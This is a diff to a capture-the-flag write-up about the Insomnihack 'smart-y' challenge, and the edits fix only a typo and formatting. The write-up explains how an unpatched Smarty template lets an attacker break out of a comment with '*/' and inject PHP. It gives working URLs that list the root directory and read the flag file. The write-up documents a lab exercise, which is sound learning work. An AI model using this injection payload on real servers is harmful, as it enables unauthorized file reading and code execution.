@@ -83,14 +83,14 @@ The patch is the following:
 
 The patch prevents the user from closing the comment with `*/`.
 Since the website uses a version of Smarty that doesn't contain this patch,
-was should be able to **close the comment and inject our own code**.
+we should be able to **close the comment and inject our own code**.
 
 Let's try it.
  
 ## Exploit
  
 1. We start by listing the root directory by visiting the following URL:
-`http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(scandir(%27/%27));/*`
+http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(scandir(%27/%27));/*
 
 This outputs the following result:
 ```
@@ -156,11 +156,11 @@ This outputs the following result:
 
 2. It worked! Now that we got the path to the flag, all that's left is to
 actually print it by visiting:
-`http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(file_get_contents(%22/flag%22));/*`.
+http://smart-y.teaser.insomnihack.ch/console.php?id=*/var_dump(file_get_contents(%22/flag%22));/*.
 
 Aaaand, here's the flag:
 
-```string(26) "INS{why_being_so_smart-y}```
+**string(26) "INS{why_being_so_smart-y}"**
 
 ## Conclusion
 
